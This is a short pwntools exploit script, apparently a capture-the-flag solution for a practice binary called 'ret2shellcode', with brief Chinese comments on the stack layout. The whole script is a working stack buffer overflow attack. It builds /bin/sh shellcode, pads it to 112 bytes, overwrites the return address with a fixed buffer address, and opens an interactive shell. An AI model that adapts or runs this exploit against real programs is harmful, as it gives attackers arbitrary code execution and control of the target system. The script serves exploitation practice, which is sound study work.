from pwn import *
p=process('./ret2shellcode')
shellcode=asm(shellcraft.sh())
buf2_addr=0x804a080

# strncpy(buf2, &s, 0x64u); 
# 栈：局部变量 0x64, 参数1, 
p.sendline(shellcode.ljust(112,'A')+p32(buf2_addr))
p.interactive()
